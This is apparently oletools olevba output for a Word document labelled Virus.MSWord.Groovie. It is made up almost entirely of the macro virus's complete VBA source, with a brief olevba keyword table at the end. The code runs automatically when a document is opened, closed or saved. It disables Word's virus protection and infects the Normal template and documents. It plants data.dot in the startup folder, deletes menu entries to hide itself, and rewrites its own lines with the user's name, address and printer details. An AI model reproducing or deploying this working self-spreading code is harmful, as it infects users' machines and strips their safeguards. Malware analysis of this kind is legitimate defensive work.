olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Groovie-9e2b844eab874652ff24add40f15c7579251d2de
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Groovie-9e2b844eab874652ff24add40f15c7579251d2de 
in file: Virus.MSWord.Groovie-9e2b844eab874652ff24add40f15c7579251d2de - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public I01 As String
 ' MeMeX8/30/00 2:00:19 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
Public I02 As Boolean
 ' MeMeX8/30/00 2:00:19 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
Public I03 As Boolean
 ' MeMeX8/30/00 2:00:19 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
Public I04 As Boolean
 ' MeMeX8/30/00 2:00:19 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
Public I05 As Boolean
 ' MeMeX8/30/00 2:00:19 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
Public I06 As String
 ' MeMeX8/30/00 2:00:19 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
Public I07 As Boolean
 ' MeMeX8/30/00 2:00:19 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
Public I08 As Boolean
 ' MeMeX8/30/00 2:00:19 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
Function I09()
 ' MeMeX8/30/00 2:00:19 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
On Error Resume Next
 ' MeMeX8/30/00 2:00:19 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
    If MacroContainer = NormalTemplate Then
 ' MeMeX8/30/00 2:00:19 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
        I01 = "normal"
 ' MeMeX8/30/00 2:00:19 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
        GoTo checkout
 ' MeMeX8/30/00 2:00:19 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
    End If
 ' MeMeX8/30/00 2:00:19 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
    If MacroContainer = ActiveDocument Then I01 = "document"
 ' MeMeX8/30/00 2:00:19 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
    If MacroContainer = "data.dot" Then I01 = "orbit"
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
checkout:
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
End Function
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
Function I10()
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
On Error Resume Next
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
    If Dir(Application.StartupPath + "\data.dot") = "data.dot" Then I02 = True
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
        If ActiveDocument.VBProject.VBComponents(i).Name = "groovie" Then I04 = True
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
    Next i
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
    For i = 1 To NormalTemplate.VBProject.VBComponents.Count
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
        If NormalTemplate.VBProject.VBComponents(i).Name = "groovie" Then I03 = True
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
    Next i
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
    If GetAttr(NormalTemplate.FullName) = vbArchive + vbReadOnly Or GetAttr(NormalTemplate.FullName) = vbReadOnly Then I05 = True
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
End Function
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
Function I11()
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
On Error Resume Next
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
Call I09
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
Call I10
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
    If I01 = "document" Then Call I12
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
    If I01 = "normal" Then Call I13
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
    If I01 = "orbit" Then Call I14
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
    If I05 = False Then CommandBars("tools").Controls("Macro").Delete
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
    If I05 = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
End Function
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
Function I12()
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
On Error Resume Next
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
    Application.VBE.ActiveVBProject.VBComponents("groovie").Export "c:\groovie.sys"
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
    If I03 = False And I05 = False Then
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
        With NormalTemplate.VBProject
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
        With .VBComponents.Import("c:\groovie.sys")
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
        End With
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
        End With
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
    End If
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
    If I02 = False Then
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
        If I08 = False Then Documents.Open FileName:=I06
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
        Shell ("label c: groovie"), 0
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
        Windows(1).Close
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
    End If
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
End Function
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
Function I13()
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
On Error Resume Next
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
Application.ScreenUpdating = False
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
    Call I17
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
    If I04 = False And I07 = True Then
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
        With ActiveDocument.VBProject
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
        With .VBComponents.Import("c:\groovie.sys")
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
        End With
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
        End With
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
        With Dialogs(wdDialogFileSummaryInfo)
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
            .Comments = "ALT-F11 says it's groovie!"
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
            .Execute
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
        End With
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
    End If
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
    If I02 = False And I07 = True Then
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
        If I08 = False Then Documents.Open FileName:=I06
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
    End If
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
    If I02 = False And I07 = False Then
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
        Documents.Add Template:="", NewTemplate:=False
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
    End If
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
Application.ScreenUpdating = True
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
End Function
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
Function I14()
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
On Error Resume Next
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
Application.ScreenUpdating = False
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
        If I03 = False And I05 = False Then
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
            With NormalTemplate.VBProject
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
            With .VBComponents.Import("c:\groovie.sys")
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
            End With
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
            End With
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
            NormalTemplate.Save
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
        End If
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
        If I04 = False Then
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
            With ActiveDocument.VBProject
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
            With .VBComponents.Import("c:\groovie.sys")
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
            End With
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
            End With
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
            With Dialogs(wdDialogFileSummaryInfo)
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
                .Comments = "ALT-F11 says it's groovie!"
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
                .Execute
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
            End With
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
        End If
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
Application.ScreenUpdating = True
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
End Function
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
Function I15()
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
On Error Resume Next
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
    Options.VirusProtection = False
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
    Options.SaveNormalPrompt = False
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
    Options.ConfirmConversions = False
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
    I06 = ActiveDocument.FullName
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
    Call I11
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
End Function
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
Sub AutoOpen()
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
On Error Resume Next
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
Call I15
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
End Sub
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
Sub AutoClose()
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
On Error Resume Next
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
I08 = True
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
Call I15
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
End Sub
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
Sub AutoExit()
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
On Error Resume Next
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
Call I15
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
End Sub
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
Sub FileSaveAs()
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
On Error Resume Next
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
Call I16
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
Call I15
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
Dialogs(wdDialogFileSaveAs).Show
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
End Sub
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
Sub filesave()
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
On Error Resume Next
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
Call I16
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
Call I15
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
End Sub
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
Sub fileclose()
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
On Error Resume Next
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
I08 = True
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
Call I15
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
ActiveDocument.Close
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
End Sub
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
Sub fileprint()
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
On Error Resume Next
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
Call I15
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
Dialogs(wdDialogFilePrint).Show
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
End Sub
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
Sub ViewVBCode()
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
MsgBox "It's GROOVIE", vbOKOnly, "�  ALT-F11  � says..."
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
End Sub
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
Sub ToolsMacro()
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
End Sub
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
Sub FileTemplates()
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
End Sub
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
Function I17()
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
On Error GoTo docek
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
    If ActiveDocument.Name <> "" Then
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
        I07 = True
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
    End If
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
    GoTo over
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
docek:
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
    I07 = False
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
over:
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
End Function
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
Function I16()
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
Randomize
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
rn = Int(Rnd * 999)
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
With Application.VBE.ActiveVBProject.VBComponents("Groovie").CodeModule
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
For x = 2 To 358 Step 2
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
.deletelines x
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
.InsertLines x, " ' " & Application.UserInitials & Now & rn & Application.UserName & Application.UserAddress & rn & Application.ActivePrinter
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
Next x
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
End With
 ' MeMeX8/30/00 2:00:20 PM248JonMMx 2000JonMMx2000@yahoo.com248Canon BJC-1000SP on LPT1:
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+
